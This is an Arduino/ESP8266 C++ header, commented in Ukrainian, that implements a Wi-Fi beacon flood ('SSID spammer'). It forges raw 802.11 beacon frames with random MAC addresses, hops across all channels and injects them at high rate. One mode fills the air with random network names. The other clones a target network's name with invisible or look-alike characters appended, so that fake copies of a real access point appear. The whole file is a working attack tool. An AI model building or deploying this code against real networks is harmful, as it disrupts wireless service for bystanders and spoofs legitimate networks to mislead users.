#ifndef SSID_SPAMMER_H
#define SSID_SPAMMER_H

#include <Arduino.h>
#include <ESP8266WiFi.h>
extern "C" {
#include "user_interface.h"
  typedef void (*freedom_outside_cb_t)(uint8 status);
  int wifi_register_send_pkt_freedom_cb(freedom_outside_cb_t cb);
  void wifi_unregister_send_pkt_freedom_cb(void);
  int wifi_send_pkt_freedom(uint8 *buf, int len, bool sys_seq);
}

// === Налаштування === //
const uint8_t channels[] = {1,2,3,4,5,6,7,8,9,10,11,12,13,14}; // Доступні Wi-Fi канали
const bool appendSpaces = 0;
const bool wpa2 = 1; // WPA2 networks


char emptySSID[32];
uint8_t macAddr[6];
uint8_t channelIndex = 0;
uint8_t wifi_channel = 1;


uint32_t packetSize = 0;
 uint32_t packetCounter = 0;
 uint32_t attackTime = 0;
 uint32_t packetRateTime = 0;

 uint8_t beaconPacket[109] = {
  0x80, 0x00, 0x00, 0x00,
  0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
  0x01, 0x02, 0x03, 0x04, 0x05, 0x06,
  0x01, 0x02, 0x03, 0x04, 0x05, 0x06,
  0x00, 0x00,
  0x83, 0x51, 0xf7, 0x8f, 0x0f, 0x00, 0x00, 0x00,
  0xe8, 0x03,
  0x31, 0x00,
  0x00, 0x20,
  0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20,
  0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20,
  0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20,
  0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20,
  0x01, 0x08,
  0x82, 0x84, 0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c,
  0x03, 0x01,
  0x01,
  0x30, 0x18,
  0x01, 0x00,
  0x00, 0x0f, 0xac, 0x02,
  0x02, 0x00,
  0x00, 0x0f, 0xac, 0x04, 0x00, 0x0f, 0xac, 0x04,
  0x01, 0x00,
  0x00, 0x0f, 0xac, 0x02,
  0x00, 0x00
};

// === Функції === //
void nextChannel() {
  	if (sizeof(channels) > 1) {
    	uint8_t ch = channels[channelIndex++];
    	if (channelIndex >= sizeof(channels)) channelIndex = 0;

    	if (ch != wifi_channel && ch >= 1 && ch <= 14) {
      		wifi_channel = ch;
      		wifi_set_channel(wifi_channel);
    	}
  	}
}

void randomMac() {
  for (int i = 0; i < 6; i++) macAddr[i] = random(256);
}

void init_flood_attack(bool enableWPA2 ) {
  	for (int i = 0; i < 32; i++) emptySSID[i] = ' ';
  	randomSeed(os_random());

	packetSize = sizeof(beaconPacket);
  	beaconPacket[34] = enableWPA2 ? 0x31 : 0x21;
  	if (!wpa2) packetSize -= 26;

  	randomMac();

  	WiFi.mode(WIFI_OFF);
    
  	wifi_set_opmode(STATION_MODE);
  	wifi_set_channel(channels[0]);
  	//як розігнати esp8266 до 160MHz

  	Serial.begin(115200);
  	Serial.println("SSID spammer initialized.");
}
void generateRandomSSID(char* ssidBuf, size_t bufSize) {
    if (bufSize < 2) {
        ssidBuf[0] = '\0'; // Порожній рядок
        return;
    }

    const char charset[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    int len = random(8, min(15, static_cast<int>(bufSize) - 1)); // Довжина SSID від 8 до мін(bufSize - 1, 14)

    for (int i = 0; i < len; i++) {
        ssidBuf[i] = charset[random(0, sizeof(charset) - 1)]; // Випадковий символ із `charset`
    }
    ssidBuf[len] = '\0'; // Завершення рядка
}

void generateTpLinkCloneSSID(char* buffer, size_t length, char* ssid) {

    const char* tricks[] = {
        "\n",
        "",             // стандартний
        " ",
        "  ",
        "   ",
        "    ",            // пробіл
        "\t",           // табуляція
        "\u200B",       // zero-width space
        "\u200C",       // zero-width non-joiner
        "\u200D",       // zero-width joiner
        "\xE2\x80\x8B", // UTF-8 zero-width space
        "．",           // fullwidth dot
        " \n",            // bullet point
        "\n  ",            // fullwidth colon
        " \n ",            // small latin t
        "\n   ",            // cursive latin T
        "   \n",            // small latin t
        "\u200B1",      // zero-width space + 1
        "\u200C2",
        "⧫",            // black diamond
    "★",            // star symbol
    "∗",            // asterisk operator
    "♠",            // spade symbol
    "♣",            // club symbol
    "♦",            // diamond symbol
    "♥",            // heart symbol
    "☃",            // snowman
    "⌀",            // diameter symbol
    "™",            // trademark symbol
    "®",            // registered symbol
    "©",            // copyright symbol
    "µ",            // micro sign
    "ø",            // small o with stroke
    "⛔",            // prohibition sign
    "☁",            // cloud symbol
    "∞",            // infinity symbol
    "⟁",            // n-ary sum symbol
    "⚡",            // high voltage symbol
    "☀",            // sun symbol
    "⌘",            // command key symbol (Apple)
    "⌚",            // watch symbol      // zero-width non-joiner + 2
    };

    const int trickCount = sizeof(tricks) / sizeof(tricks[0]);
    const char* trick = tricks[random(0, trickCount)];

    snprintf(buffer, length, "%s%s", ssid, trick);
}



//returns packets per second
//returns packets per second
int run_flood_attack(bool enableWPA2, int ssidsCount, bool attack_type, char* ssid_target) {
    uint32_t now = millis();

    if (now - attackTime > 100) {
        attackTime = now;

        nextChannel();

        // Статичний буфер для тимчасового пакета
        uint8_t tmpPacket[109]; // Максимальний розмір пакета

        for (int ssidNum = 1; ssidNum <= ssidsCount; ssidNum++) {
            char ssid[33];

            // Генерація SSID
            if (attack_type) {
                generateTpLinkCloneSSID(ssid, 33, ssid_target);
            } else {
                generateRandomSSID(ssid, sizeof(ssid));
            }

            uint8_t ssidLen = strlen(ssid);
            macAddr[5] = ssidNum; // Унікальна MAC-адреса

            // Запис MAC-адреси в Beacon-пакет
            memcpy(&beaconPacket[10], macAddr, 6);
            memcpy(&beaconPacket[16], macAddr, 6);

            // Очищення та запис SSID
            memset(&beaconPacket[38], 0, 32);
            memcpy(&beaconPacket[38], ssid, ssidLen);
            beaconPacket[37] = ssidLen;
            beaconPacket[82] = wifi_channel;

            if (appendSpaces) {
                // Відправка пакета з фіксованим розміром
                for (int k = 0; k < 3; k++) {
                    packetCounter += wifi_send_pkt_freedom(beaconPacket, packetSize, 0) == 0;
                    delay(1);
                }
            } else {
                // Заповнення тимчасового пакета
                uint16_t tmpPacketSize = (packetSize - 32) + ssidLen;
                memcpy(tmpPacket, beaconPacket, 38 + ssidLen);
                tmpPacket[37] = ssidLen;
                memcpy(&tmpPacket[38 + ssidLen], &beaconPacket[70], wpa2 ? 39 : 13);

                // Відправка пакета
                for (int k = 0; k < 3; k++) {
                    packetCounter += wifi_send_pkt_freedom(tmpPacket, tmpPacketSize, 0) == 0;
                    delay(1);
                }
            }
        }
    }

    // Вивід статистики кожну секунду
    if (now - packetRateTime > 1000) {
        packetRateTime = now;
        Serial.print("Packets/s: ");
        Serial.println(packetCounter);
        packetCounter = 0;
    }
        return packetCounter;
}


#endif